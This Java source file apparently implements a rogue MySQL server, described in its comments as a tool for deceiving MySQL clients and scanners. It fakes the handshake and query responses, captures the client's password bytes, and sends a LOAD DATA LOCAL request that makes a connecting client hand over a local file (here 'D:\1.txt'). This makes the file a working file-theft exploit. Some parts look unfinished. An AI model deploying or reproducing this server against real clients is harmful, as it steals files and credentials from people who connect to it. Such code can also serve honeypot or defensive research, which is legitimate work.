package org.sec.Network;

import org.apache.log4j.Logger;
import org.sec.Constant.configuration;
import org.sec.utils.stringUtils;

import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.nio.charset.StandardCharsets;

public class Socket extends Thread {
    private ServerSocket serverSocket;
    private static final Logger logger = Logger.getLogger(Socket.class);

    public static void main(String[] args) {
        connect(configuration.PORT);
    }

    public static void connect(int port) {
        try {
            Thread t = new Socket(port);
            t.run();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception ignored) {
        }
    }

    public Socket(int port) throws IOException {
        serverSocket = new ServerSocket(port);
    }

    public void DeceptionScanner() throws IOException {
        while (true) {
            java.net.Socket server = null;
            try {
                server = serverSocket.accept();
                logger.info("[+] 已连接的客户端: " + server.getRemoteSocketAddress());
                DataInputStream in = new DataInputStream(server.getInputStream());
                DataOutputStream out = new DataOutputStream(server.getOutputStream());

                out.write(stringUtils.hexToByteArray(configuration.flushVersionText()));
                out.flush();
                byte[] bys = new byte[1024];
                in.read(bys);   // 读取客户端发来的账号密码并验证

                out.write(configuration.verificationText); // res ok
                out.flush();
                bys = new byte[1024];
                in.read(bys);


                out.write(stringUtils.hexToByteArray(configuration.showVariables1));
                out.write(stringUtils.hexToByteArray(configuration.showVariables2));
                out.flush();
                bys = new byte[9999];
                in.read(bys);           // req query

                out.write(configuration.showWarnings);  //
                out.flush();
                bys = new byte[9999];
                in.read(bys);

                out.write(stringUtils.hexToByteArray(configuration.showCollation));
                out.flush();
                bys = new byte[9999];
                in.read(bys);

                String filename = "D:\\1.txt";
                getData(filename, server);
            } catch (IOException e) {
                e.printStackTrace();
                throw new RuntimeException(e);
            } finally {
                server.close();
            }
        }
    }

    public void deceptionMysqlCMD() throws IOException {
        while (true) {
            java.net.Socket server = null;
            try {
                byte[] clientPassword = new byte[20];
                byte[] clientUserAccount = new byte[20];

                server = serverSocket.accept();
                logger.info("[+] 已连接的客户端: " + server.getRemoteSocketAddress());
                DataInputStream in = new DataInputStream(server.getInputStream());
                DataOutputStream out = new DataOutputStream(server.getOutputStream());

                out.write(stringUtils.hexToByteArray(configuration.flushVersionText())); // 发送mysql版本信息
                out.flush();
                byte[] bys = new byte[1024]; // 下标为41~61为客户端发来的password
                in.read(bys);
                for (int i = 0; i < 20; i++) {
                    clientPassword[i] = bys[42 + i];
                }

                // 处理客户端发来的数据包,提取出salt和password,salt结合自己预设的密码 =>变为最终的ServerPassword,password和ServerPassword相等时即验证成功

                out.write(configuration.verificationText);  // res ok
                out.flush();
                bys = new byte[1024];
                in.read(bys);

                String filename = "D:\\1.txt";
                //getData(filename, server);

            } catch (IOException e) {
                e.printStackTrace();
                throw new RuntimeException(e);
            } finally {
                server.close();
            }
        }
    }

    // 欺骗mysql命令行登录
    public void run() {
        try {
            deceptionMysqlCMD();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public static void getData(String filename, java.net.Socket server) throws IOException {
        //String basePath = "";
        byte[] byte1 = new byte[]{(byte) (filename.length() + 1)};
        byte[] byte2 = {0x00, 0x00, 0x01, (byte) 0xfb};
        byte[] byte3 = filename.getBytes(StandardCharsets.UTF_8);

        byte[] lastByte = stringUtils.byteMerger(byte1, byte2);
        lastByte = stringUtils.byteMerger(lastByte, byte3);

        DataInputStream in = new DataInputStream(server.getInputStream());
        DataOutputStream out = new DataOutputStream(server.getOutputStream());

        out.write(lastByte);
        out.flush();
        byte[] bys = new byte[9999];
        in.read(bys);
        System.out.println(new String(bys, 0, in.read(bys)));

    }
}
